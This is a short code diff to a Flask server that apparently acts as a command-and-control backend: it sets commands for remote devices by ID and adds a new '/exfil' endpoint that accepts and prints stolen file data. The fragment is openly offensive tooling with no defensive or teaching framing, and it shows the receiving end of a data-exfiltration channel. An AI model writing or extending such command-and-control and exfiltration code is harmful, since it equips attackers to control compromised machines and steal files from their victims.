@@ -40,5 +40,11 @@ def set_command():
     print(f"[!] Command for {device_id} set to: {command}")
     return jsonify({"status": "command set"})
 
+@app.route("/exfil", methods=["POST"])
+def receive_file():
+    content = request.data.decode()
+    print(f"\n[EXFIL] Received file data:\n{content}\n")
+    return jsonify({"status": "received"})
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
